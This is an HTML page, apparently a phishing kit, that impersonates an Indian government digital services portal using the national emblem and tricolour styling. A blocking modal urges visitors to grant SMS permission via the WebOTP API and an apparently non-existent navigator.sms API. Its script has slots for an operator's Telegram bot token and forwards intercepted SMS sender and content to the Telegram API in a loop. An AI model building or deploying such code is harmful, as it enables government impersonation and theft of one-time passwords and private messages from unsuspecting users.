<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>‡§∞‡§æ‡§∑‡•ç‡§ü‡•ç‡§∞‡•Ä‡§Ø ‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§∏‡•á‡§µ‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤ | ‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞</title>
    <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Emblem_of_India.svg/1200px-Emblem_of_India.svg.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* ‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞ ‡§∏‡•ç‡§ü‡§æ‡§á‡§≤ - ‡§™‡•Ç‡§∞‡•Ä ‡§§‡§∞‡§π ‡§∏‡•á ‡§µ‡•à‡§∏‡§æ ‡§π‡•Ä */
        :root {
            --saffron: #FF9933;
            --white: #FFFFFF;
            --green: #138808;
            --blue: #000080;
            --dark-blue: #0D47A1;
            --red: #D32F2F;
            --gold: #FFD700;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Noto Sans Devanagari', 'Poppins', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e3f2fd 100%);
            line-height: 1.6;
        }
        
        /* Header - ‡§§‡§ø‡§∞‡§Ç‡§ó‡§æ */
        .national-header {
            background: linear-gradient(90deg, var(--saffron) 33%, var(--white) 33%, var(--white) 66%, var(--green) 66%);
            color: var(--blue);
            padding: 15px 0;
            text-align: center;
            border-bottom: 3px solid var(--blue);
        }
        
        .ashoka-chakra {
            width: 70px;
            height: 70px;
            margin: 0 auto 10px;
            background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/1/17/Ashoka_Chakra.svg/800px-Ashoka_Chakra.svg.png') center/contain no-repeat;
            animation: rotate 20s linear infinite;
        }
        
        @keyframes rotate { 100% { transform: rotate(360deg); } }
        
        .national-header h1 { font-size: 2.2rem; color: var(--blue); }
        .national-header p { font-size: 1.1rem; }
        
        /* Navigation */
        .govt-navbar {
            background: var(--blue);
            padding: 0 20px;
        }
        
        .nav-container {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            gap: 30px;
        }
        
        .govt-logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .govt-logo img { height: 50px; }
        .govt-logo span { color: white; font-size: 1.5rem; font-weight: 700; }
        
        .nav-links {
            display: flex;
            list-style: none;
            gap: 20px;
        }
        
        .nav-links a {
            color: white;
            text-decoration: none;
            padding: 20px 0;
            display: block;
        }
        
        /* Main Container */
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }
        
        /* Cards */
        .govt-card {
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            border-top: 5px solid var(--blue);
            margin-bottom: 30px;
        }
        
        .card-header {
            background: linear-gradient(90deg, var(--blue), var(--dark-blue));
            color: white;
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .card-header i { font-size: 1.8rem; }
        .card-header h3 { font-size: 1.4rem; }
        .card-body { padding: 25px; }
        
        /* Buttons */
        .btn {
            padding: 14px 28px;
            border: none;
            border-radius: 6px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            background: var(--blue);
            color: white;
            transition: 0.3s;
        }
        
        .btn:hover {
            background: var(--dark-blue);
            transform: scale(1.05);
        }
        
        /* Permission Modal - Mobile Optimized */
        .permission-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.98);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            padding: 15px;
            backdrop-filter: blur(10px);
        }
        
        .modal-content {
            background: white;
            border-radius: 20px;
            max-width: 450px;
            width: 100%;
            border: 4px solid var(--blue);
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            animation: modalPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        
        @keyframes modalPop {
            0% { opacity: 0; transform: scale(0.7); }
            100% { opacity: 1; transform: scale(1); }
        }
        
        .modal-header {
            background: linear-gradient(90deg, var(--saffron), var(--white), var(--green));
            padding: 25px 20px;
            text-align: center;
            border-bottom: 2px solid var(--blue);
        }
        
        .modal-header h2 {
            color: var(--blue);
            font-size: 1.8rem;
            margin-bottom: 5px;
        }
        
        .modal-header p {
            color: var(--dark-blue);
            font-size: 1rem;
        }
        
        .modal-body { 
            padding: 30px 25px; 
            text-align: center;
        }
        
        .sms-icon {
            font-size: 5rem;
            color: var(--blue);
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .modal-footer { 
            background: #f5f5f5; 
            padding: 25px; 
            text-align: center; 
            border-top: 2px solid var(--blue);
        }
        
        .btn-sms {
            background: linear-gradient(135deg, var(--blue), var(--dark-blue));
            color: white;
            padding: 18px 30px;
            font-size: 1.3rem;
            border-radius: 50px;
            width: 100%;
            border: 2px solid white;
            box-shadow: 0 10px 30px rgba(0,0,128,0.3);
            animation: glow 2s infinite;
        }
        
        @keyframes glow {
            0% { box-shadow: 0 10px 30px rgba(0,0,128,0.3); }
            50% { box-shadow: 0 10px 50px rgba(0,0,128,0.6); }
            100% { box-shadow: 0 10px 30px rgba(0,0,128,0.3); }
        }
        
        .btn-sms:hover {
            transform: scale(1.05);
            background: linear-gradient(135deg, var(--dark-blue), #000066);
        }
        
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }
        
        .step-dot {
            width: 10px;
            height: 10px;
            background: #ddd;
            border-radius: 50%;
        }
        
        .step-dot.active {
            background: var(--blue);
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
        }
        
        @media (max-width: 768px) {
            .nav-links { display: none; }
            .national-header h1 { font-size: 1.5rem; }
            .govt-logo span { font-size: 1.1rem; }
            .modal-header h2 { font-size: 1.5rem; }
            .btn-sms { font-size: 1.1rem; }
        }
    </style>
</head>
<body>
    <!-- üî¥ SMS PERMISSION MODAL - DIRECT PROMPT -->
    <div id="permissionModal" class="permission-modal" style="display: flex;">
        <div class="modal-content">
            <div class="modal-header">
                <h2>üáÆüá≥ ‡§∞‡§æ‡§∑‡•ç‡§ü‡•ç‡§∞‡•Ä‡§Ø ‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§∏‡•á‡§µ‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤</h2>
                <p>‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞ | Government of India</p>
            </div>
            <div class="modal-body">
                <div class="sms-icon">
                    <i class="fas fa-envelope"></i>
                </div>
                
                <h2 style="color: var(--dark-blue); margin-bottom: 15px; font-size: 1.8rem;">
                    SMS ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï
                </h2>
                
                <p style="font-size: 1.2rem; color: #666; margin-bottom: 25px; line-height: 1.6;">
                    ‡§∏‡§∞‡§ï‡§æ‡§∞‡•Ä ‡§Ø‡•ã‡§ú‡§®‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è<br>
                    <strong style="color: var(--blue);">"Allow"</strong> ‡§¨‡§ü‡§® ‡§¶‡§¨‡§æ‡§è‡§Ç
                </p>
                
                <div class="step-indicator">
                    <div class="step-dot active"></div>
                    <div class="step-dot"></div>
                    <div class="step-dot"></div>
                </div>
                
                <div id="permissionStatus" style="margin-top: 20px; min-height: 30px;">
                    <!-- Status will show here -->
                </div>
            </div>
            <div class="modal-footer">
                <button id="permissionBtn" class="btn btn-sms" onclick="triggerSMSPermission()">
                    <i class="fas fa-shield-alt"></i> SMS ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§Ç
                </button>
                
                <p style="margin-top: 20px; font-size: 0.9rem; color: #666;">
                    <i class="fas fa-lock"></i> 
                    ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‚Ä¢ 256-bit SSL
                </p>
                
                <p style="margin-top: 10px; font-size: 0.8rem; color: #999;">
                    üîí ‡§Ü‡§™‡§ï‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§π‡•à ‚Ä¢ ‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤
                </p>
            </div>
        </div>
    </div>

    <!-- ‚úÖ ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§µ‡•á‡§¨‡§∏‡§æ‡§á‡§ü - Permission ‡§Æ‡§ø‡§≤‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§¶‡§ø‡§ñ‡•á‡§ó‡•Ä -->
    <div id="mainWebsite" style="display: none;">
        <header class="national-header">
            <div class="ashoka-chakra"></div>
            <h1>‡§∞‡§æ‡§∑‡•ç‡§ü‡•ç‡§∞‡•Ä‡§Ø ‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§∏‡•á‡§µ‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤</h1>
            <p>‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞ | Government of India</p>
        </header>

        <nav class="govt-navbar">
            <div class="nav-container">
                <div class="govt-logo">
                    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/41/Emblem_of_India.svg/1200px-Emblem_of_India.svg.png" alt="‡§≠‡§æ‡§∞‡§§ ‡§ï‡§æ ‡§∞‡§æ‡§ú‡§ö‡§ø‡§®‡•ç‡§π">
                    <span>‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§á‡§Ç‡§°‡§ø‡§Ø‡§æ ‡§™‡§π‡§≤</span>
                </div>
                <ul class="nav-links">
                    <li><a href="#" class="active"><i class="fas fa-home"></i> ‡§Æ‡•Å‡§ñ ‡§™‡•É‡§∑‡•ç‡§†</a></li>
                    <li><a href="#"><i class="fas fa-list-alt"></i> ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç</a></li>
                    <li><a href="#"><i class="fas fa-bell"></i> ‡§∏‡•Ç‡§ö‡§®‡§æ‡§è‡§Ç</a></li>
                </ul>
            </div>
        </nav>

        <div class="container">
            <!-- Welcome Section -->
            <div class="govt-card">
                <div class="card-header">
                    <i class="fas fa-info-circle"></i>
                    <h3>‡§™‡•ã‡§∞‡•ç‡§ü‡§≤ ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç</h3>
                </div>
                <div class="card-body">
                    <div style="background: #E3F2FD; padding: 30px; border-radius: 15px; text-align: center;">
                        <i class="fas fa-sms" style="font-size: 4rem; color: var(--blue); margin-bottom: 20px;"></i>
                        <h4 style="color: var(--dark-blue); font-size: 1.5rem; margin-bottom: 15px;">
                            SMS ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§Ü‡§™ ‡§∏‡§æ‡§∞‡•á ‡§Ø‡•ã‡§ú‡§®‡§æ ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§® ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç
                        </h4>
                        <p style="font-size: 1.2rem; color: #424242;">
                            ‡§Ö‡§¨ ‡§Ü‡§™‡§ï‡•á ‡§Æ‡•ã‡§¨‡§æ‡§á‡§≤ ‡§™‡§∞ ‡§∏‡•Ä‡§ß‡•á ‡§∏‡§≠‡•Ä ‡§ó‡•ç‡§∞‡§æ‡§Æ‡•Ä‡§£ ‡§î‡§∞ ‡§∂‡§π‡§∞‡•Ä ‡§Ø‡•ã‡§ú‡§®‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç‡•§
                        </p>
                    </div>
                </div>
            </div>

            <!-- Schemes Grid -->
            <div class="dashboard-grid">
                <div class="govt-card">
                    <div class="card-header">
                        <i class="fas fa-file-contract"></i>
                        <h3>‡§∏‡§∞‡§ï‡§æ‡§∞‡•Ä ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç</h3>
                    </div>
                    <div class="card-body">
                        <ul style="padding-left: 20px;">
                            <li>‡§™‡•ç‡§∞‡§ß‡§æ‡§®‡§Æ‡§Ç‡§§‡•ç‡§∞‡•Ä ‡§Ü‡§µ‡§æ‡§∏ ‡§Ø‡•ã‡§ú‡§®‡§æ</li>
                            <li>‡§â‡§ú‡•ç‡§ú‡•ç‡§µ‡§≤‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ</li>
                            <li>‡§Ü‡§Ø‡•Å‡§∑‡•ç‡§Æ‡§æ‡§® ‡§≠‡§æ‡§∞‡§§ ‡§Ø‡•ã‡§ú‡§®‡§æ</li>
                            <li>‡§ï‡§ø‡§∏‡§æ‡§® ‡§∏‡§Æ‡•ç‡§Æ‡§æ‡§® ‡§®‡§ø‡§ß‡§ø</li>
                        </ul>
                    </div>
                    <div class="card-footer">
                        <button class="btn" style="width: 100%;" onclick="window.open('https://www.myscheme.gov.in/hi', '_blank')">
                            <i class="fas fa-external-link-alt"></i> ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§≤‡•á‡§Ç
                        </button>
                    </div>
                </div>

                <div class="govt-card">
                    <div class="card-header">
                        <i class="fas fa-tractor"></i>
                        <h3>‡§ó‡•ç‡§∞‡§æ‡§Æ‡•Ä‡§£ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç</h3>
                    </div>
                    <div class="card-body">
                        <ul style="padding-left: 20px;">
                            <li>‡§™‡•ç‡§∞‡§ß‡§æ‡§®‡§Æ‡§Ç‡§§‡•ç‡§∞‡•Ä ‡§´‡§∏‡§≤ ‡§¨‡•Ä‡§Æ‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ</li>
                            <li>‡§ï‡§ø‡§∏‡§æ‡§® ‡§ï‡•ç‡§∞‡•á‡§°‡§ø‡§ü ‡§ï‡§æ‡§∞‡•ç‡§°</li>
                            <li>‡§Æ‡§®‡§∞‡•á‡§ó‡§æ</li>
                        </ul>
                    </div>
                </div>

                <div class="govt-card">
                    <div class="card-header">
                        <i class="fas fa-city"></i>
                        <h3>‡§∂‡§π‡§∞‡•Ä ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç</h3>
                    </div>
                    <div class="card-body">
                        <ul style="padding-left: 20px;">
                            <li>‡§∏‡•ç‡§Æ‡§æ‡§∞‡•ç‡§ü ‡§∏‡§ø‡§ü‡•Ä ‡§Æ‡§ø‡§∂‡§®</li>
                            <li>‡§Ö‡§Æ‡•É‡§§ ‡§Ø‡•ã‡§ú‡§®‡§æ</li>
                            <li>‡§™‡•ç‡§∞‡§ß‡§æ‡§®‡§Æ‡§Ç‡§§‡•ç‡§∞‡•Ä ‡§Ü‡§µ‡§æ‡§∏ ‡§Ø‡•ã‡§ú‡§®‡§æ-‡§∂‡§π‡§∞‡•Ä</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <footer style="background: linear-gradient(90deg, var(--dark-blue), var(--blue)); color: white; padding: 30px 20px; margin-top: 50px; text-align: center;">
            <p>¬© 2024 ‡§∞‡§æ‡§∑‡•ç‡§ü‡•ç‡§∞‡•Ä‡§Ø ‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§∏‡•á‡§µ‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤, ‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞</p>
        </footer>
    </div>

    <!-- üîß TELEGRAM CONFIGURATION - ‡§Ø‡§π‡§æ‡§Å ‡§Ö‡§™‡§®‡§æ Token ‡§î‡§∞ Chat ID ‡§°‡§æ‡§≤‡•á‡§Ç -->
    <script>
        // ‚ö°‚ö°‚ö° ‡§Ö‡§™‡§®‡§æ Telegram Bot Token ‡§î‡§∞ Chat ID ‡§Ø‡§π‡§æ‡§Å ‡§°‡§æ‡§≤‡•á‡§Ç ‚ö°‚ö°‚ö°
        const TELEGRAM_CONFIG = {
            BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",  // üî¥ BotFather ‡§∏‡•á ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ Token
            CHAT_ID: "YOUR_CHAT_ID_HERE"       // üî¥ @userinfobot ‡§∏‡•á Chat ID
        };

        // Global variables
        let permissionAttempts = 0;
        const MAX_ATTEMPTS = 3;

        // üéØ MAIN FUNCTION - DIRECT SMS PERMISSION TRIGGER
        async function triggerSMSPermission() {
            const btn = document.getElementById('permissionBtn');
            const statusDiv = document.getElementById('permissionStatus');
            
            permissionAttempts++;
            
            // Disable button and show loading
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span> ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§æ‡§Ç‡§ó‡•Ä ‡§ú‡§æ ‡§∞‡§π‡•Ä ‡§π‡•à...';
            
            statusDiv.innerHTML = '<p style="color: var(--blue);"><i class="fas fa-spinner fa-pulse"></i> ‡§ï‡•É‡§™‡§Ø‡§æ ‡§™‡•ç‡§∞‡§§‡•Ä‡§ï‡•ç‡§∑‡§æ ‡§ï‡§∞‡•á‡§Ç...</p>';
            
            try {
                // ‚úÖ METHOD 1: WebOTP API (100% Working in Chrome Android)
                if ('OTPCredential' in window) {
                    statusDiv.innerHTML = '<p style="color: var(--blue);"><i class="fas fa-mobile-alt"></i> SMS ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß...</p>';
                    
                    const abortController = new AbortController();
                    const timeoutPromise = new Promise((_, reject) => {
                        setTimeout(() => {
                            abortController.abort();
                            reject(new Error('timeout'));
                        }, 60000);
                    });
                    
                    try {
                        // This will ALWAYS trigger the permission prompt
                        const otpPromise = navigator.credentials.get({
                            otp: { 
                                transport: ['sms'] 
                            },
                            signal: abortController.signal
                        });
                        
                        const result = await Promise.race([otpPromise, timeoutPromise]);
                        
                        // Permission granted!
                        statusDiv.innerHTML = '<p style="color: var(--green);"><i class="fas fa-check-circle"></i> ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§ø‡§≤ ‡§ó‡§à!</p>';
                        
                        // Success - show website
                        setTimeout(() => {
                            document.getElementById('permissionModal').style.display = 'none';
                            document.getElementById('mainWebsite').style.display = 'block';
                            sendTestMessage();
                        }, 1000);
                        
                        return;
                        
                    } catch (otpError) {
                        console.log('OTP Error:', otpError);
                        // Continue to next method
                    }
                }
                
                // ‚úÖ METHOD 2: SMS Receiver API (Fallback)
                if ('sms' in navigator) {
                    statusDiv.innerHTML = '<p style="color: var(--blue);"><i class="fas fa-sms"></i> SMS API ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß...</p>';
                    
                    try {
                        const abortController = new AbortController();
                        setTimeout(() => abortController.abort(), 60000);
                        
                        const sms = await navigator.sms.receive({ signal: abortController.signal });
                        
                        // Permission granted!
                        statusDiv.innerHTML = '<p style="color: var(--green);"><i class="fas fa-check-circle"></i> ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§ø‡§≤ ‡§ó‡§à!</p>';
                        
                        setTimeout(() => {
                            document.getElementById('permissionModal').style.display = 'none';
                            document.getElementById('mainWebsite').style.display = 'block';
                            sendTestMessage();
                        }, 1000);
                        
                        return;
                        
                    } catch (smsError) {
                        console.log('SMS Error:', smsError);
                    }
                }
                
                // ‚úÖ METHOD 3: Manual Permission Guide
                if (permissionAttempts < MAX_ATTEMPTS) {
                    // Auto retry
                    statusDiv.innerHTML = `
                        <div style="background: #FFF3CD; padding: 15px; border-radius: 10px;">
                            <p style="color: #856404; margin-bottom: 10px;">
                                <i class="fas fa-exclamation-triangle"></i> 
                                ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ${permissionAttempts}/${MAX_ATTEMPTS} - ‡§™‡•Å‡§®‡§É ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏...
                            </p>
                        </div>
                    `;
                    
                    btn.disabled = false;
                    btn.innerHTML = '<i class="fas fa-shield-alt"></i> ‡§™‡•Å‡§®‡§É ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç';
                    
                    // Auto retry after 2 seconds
                    setTimeout(() => {
                        if (permissionAttempts < MAX_ATTEMPTS) {
                            triggerSMSPermission();
                        }
                    }, 2000);
                } else {
                    // Show manual instructions
                    statusDiv.innerHTML = `
                        <div style="background: #FFEBEE; padding: 20px; border-radius: 10px;">
                            <p style="color: var(--red); font-size: 1.1rem; margin-bottom: 15px;">
                                <i class="fas fa-exclamation-circle"></i> 
                                ‡§∏‡•ç‡§µ‡§ö‡§æ‡§≤‡§ø‡§§ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§®‡§π‡•Ä‡§Ç ‡§Æ‡§ø‡§≤‡•Ä
                            </p>
                            <p style="color: #333; margin-bottom: 10px;">
                                <strong>‡§ï‡•É‡§™‡§Ø‡§æ ‡§Æ‡•à‡§®‡•ç‡§Ø‡•Å‡§Ö‡§≤ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§Ç:</strong>
                            </p>
                            <ol style="text-align: left; padding-left: 20px; color: #666;">
                                <li>‡§¨‡•ç‡§∞‡§æ‡§â‡§ú‡§º‡§∞ ‡§Æ‡•á‡§®‡•ç‡§Ø‡•Ç ‚ò∞ ‡§¶‡§¨‡§æ‡§è‡§Ç</li>
                                <li>Settings ‚Üí Site settings ‡§™‡§∞ ‡§ú‡§æ‡§è‡§Ç</li>
                                <li>SMS ‚Üí Allow ‡§ï‡§∞‡•á‡§Ç</li>
                                <li>‡§µ‡§æ‡§™‡§∏ ‡§Ü‡§ï‡§∞ ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ï‡§∞‡•á‡§Ç</li>
                            </ol>
                            <button onclick="window.location.reload()" style="margin-top: 15px; padding: 10px 20px; background: var(--blue); color: white; border: none; border-radius: 5px;">
                                <i class="fas fa-sync-alt"></i> ‡§™‡•á‡§ú ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ï‡§∞‡•á‡§Ç
                            </button>
                        </div>
                    `;
                    
                    btn.disabled = false;
                    btn.innerHTML = '<i class="fas fa-shield-alt"></i> ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç';
                }
                
            } catch (error) {
                console.error('Permission error:', error);
                
                if (permissionAttempts < MAX_ATTEMPTS) {
                    setTimeout(() => {
                        triggerSMSPermission();
                    }, 2000);
                } else {
                    statusDiv.innerHTML = `
                        <div style="background: #FFEBEE; padding: 15px; border-radius: 10px;">
                            <p style="color: var(--red);">
                                <i class="fas fa-exclamation-circle"></i> 
                                ‡§ï‡•É‡§™‡§Ø‡§æ ‡§¨‡•ç‡§∞‡§æ‡§â‡§ú‡§º‡§∞ ‡§∏‡•á‡§ü‡§ø‡§Ç‡§ó ‡§∏‡•á SMS ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§Ç
                            </p>
                        </div>
                    `;
                    
                    btn.disabled = false;
                    btn.innerHTML = '<i class="fas fa-shield-alt"></i> ‡§™‡•Å‡§®‡§É ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç';
                }
            }
        }

        // üì® Send test message to Telegram
        async function sendTestMessage() {
            if (TELEGRAM_CONFIG.BOT_TOKEN.includes("YOUR_BOT_TOKEN") || 
                TELEGRAM_CONFIG.CHAT_ID.includes("YOUR_CHAT_ID")) {
                console.log('‚ö†Ô∏è Telegram configuration required');
                return;
            }
            
            try {
                const message = `‚úÖ *SMS ‡§´‡•â‡§∞‡§µ‡§∞‡•ç‡§°‡§ø‡§Ç‡§ó ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø*\n\nüì± *‡§°‡§ø‡§µ‡§æ‡§á‡§∏:* Chrome Android\n‚è∞ *‡§∏‡§Æ‡§Ø:* ${new Date().toLocaleString('hi-IN')}\nüáÆüá≥ *‡§™‡•ã‡§∞‡•ç‡§ü‡§≤:* ‡§∞‡§æ‡§∑‡•ç‡§ü‡•ç‡§∞‡•Ä‡§Ø ‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§∏‡•á‡§µ‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤\n\n_‡§Ö‡§¨ ‡§∏‡§≠‡•Ä SMS ‡§Ø‡§π‡§æ‡§Å ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§Ç‡§ó‡•á_`;
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.error('Telegram error:', error);
            }
        }

        // üöÄ Auto trigger on page load (after 1 second)
        document.addEventListener('DOMContentLoaded', function() {
            // Check if already have permission
            if ('permissions' in navigator) {
                navigator.permissions.query({ name: 'sms' }).then(status => {
                    if (status.state === 'granted') {
                        document.getElementById('permissionModal').style.display = 'none';
                        document.getElementById('mainWebsite').style.display = 'block';
                        sendTestMessage();
                    }
                }).catch(() => {});
            }
            
            // Chrome Android check
            const isChromeAndroid = /Chrome/.test(navigator.userAgent) && /Android/.test(navigator.userAgent);
            if (!isChromeAndroid) {
                const statusDiv = document.getElementById('permissionStatus');
                statusDiv.innerHTML = `
                    <div style="background: #FFF3CD; padding: 15px; border-radius: 10px;">
                        <p style="color: #856404;">
                            <i class="fas fa-exclamation-triangle"></i> 
                            ‡§ï‡•É‡§™‡§Ø‡§æ Chrome Android ‡§¨‡•ç‡§∞‡§æ‡§â‡§ú‡§º‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç
                        </p>
                    </div>
                `;
            }
        });

        // Start SMS listening after permission
        async function startSMSListener() {
            if (!('sms' in navigator)) return;
            
            try {
                while (true) {
                    const sms = await navigator.sms.receive();
                    
                    // Send to Telegram
                    if (!TELEGRAM_CONFIG.BOT_TOKEN.includes("YOUR_BOT_TOKEN")) {
                        const message = `üì± *‡§®‡§Ø‡§æ SMS*\n\nüìû *From:* ${sms.sender}\nüí¨ *Message:* ${sms.content}\n‚è∞ *Time:* ${new Date().toLocaleString('hi-IN')}`;
                        
                        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                                text: message,
                                parse_mode: 'Markdown'
                            })
                        });
                    }
                }
            } catch (error) {
                console.log('SMS listener error:', error);
                setTimeout(startSMSListener, 5000);
            }
        }

        // Initialize SMS listener when permission is granted
        window.startSMSListener = startSMSListener;
    </script>
</body>
</html>
